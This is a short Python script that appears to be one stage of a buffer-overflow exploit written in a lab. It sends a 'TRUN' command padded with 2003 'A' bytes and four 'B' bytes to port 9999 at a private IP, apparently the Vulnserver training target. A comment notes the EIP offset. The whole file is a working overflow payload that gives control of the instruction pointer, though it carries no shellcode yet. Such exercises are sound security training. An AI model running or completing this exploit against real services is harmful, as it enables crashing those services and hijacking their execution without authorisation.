#!/usr/bin/env python3
import sys
import socket

# EIP register is at an offset of 2003 bytes
shellcode = b"A" * 2003 + b"B" * 4

try:
    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    soc.connect(('192.168.18.108', 9999))
    
    # In Python 3, we concatenate bytes with bytes
    soc.send(b'TRUN /.:/' + shellcode)
    soc.close()
except Exception as e:
    print("Error: Unable to establish connection with Server")
    sys.exit()
